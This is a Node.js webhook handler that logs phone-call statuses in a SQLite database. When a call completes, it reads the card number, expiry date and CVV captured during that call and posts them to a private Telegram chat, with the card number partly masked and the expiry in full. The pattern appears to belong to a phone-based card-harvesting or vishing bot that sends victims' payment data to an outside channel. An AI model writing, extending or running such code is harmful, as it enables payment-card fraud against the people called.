module.exports = function(request, response) {
/**
 * Updates call status in the database and sends a Telegram notification if enabled.
 */
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const config = require('../config');

const db = new sqlite3.Database('./db/data.db');

const itsfrom = request.body.From || null;
const itsto = request.body.To || null;
const sid = request.body.CallSid;
const date = Date.now();
const status = request.body.CallStatus;
const table = 'calls';
const sidname = 'callSid';

    if (!itsfrom || !itsto || !sid) {
        return response.status(400).json({ error: 'Please send all the needed post data.' });
    }

    db.get(`SELECT ${sidname} FROM ${table} WHERE ${sidname} = ?`, [sid], (err, row) => {
        if (err) return console.log(err.message);

        if (!row) {
            db.run(
                `INSERT INTO ${table} (itsfrom, itsto, status, ${sidname}, date) VALUES (?, ?, ?, ?, ?)`,
                [itsfrom, itsto, status, sid, date],
                function(err) {
                    if (err) return console.log(err.message);
                    return response.status(200).json({ inserted: 'All is alright.' });
                }
            );
        } else {
            db.run(
                `UPDATE ${table} SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ${sidname} = ?`,
                [status, itsfrom, itsto, date, sid],
                function(err) {
                    if (err) return console.log(err.message);

                    // Send Telegram notification if enabled and call is completed
                    if (table === 'calls' && status === 'completed' && config.telegramBotToken && config.telegramChatId) {
                        db.get('SELECT * FROM calls WHERE callSid = ?', [sid], (err, row) => {
                            if (err) return console.error(err.message);

                            let message;
                            if (!row.card_number || !row.card_expiry || !row.card_cvv) {
                                message = `📱 Mobile Phone: ${itsto}\n❌ Card details not fully entered.`;
                            } else {
                                let masked = row.card_number.replace(/^(\d{4})\d{8,10}(\d{4})$/, '$1********$2');
                                message = `📱 Mobile Phone: ${itsto}\n💳 Card: ${masked}\nExpiry: ${row.card_expiry}\nCVV: ***`;
                            }
                            sendTelegramNotification(message);
                        });
                    }

                    return response.status(200).json({ updated: 'All is alright.' });
                }
            );
        }
    });

    function sendTelegramNotification(message) {
        const telegramUrl = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`;
        axios.post(telegramUrl, {
            chat_id: config.telegramChatId,
            text: message,
            parse_mode: 'Markdown'
        }).then((response) => {
            console.log('Telegram notification sent successfully:', response.data);
        }).catch((error) => {
            console.error('Telegram API Error:', error.response ? error.response.data : error.message);
        });
    }
};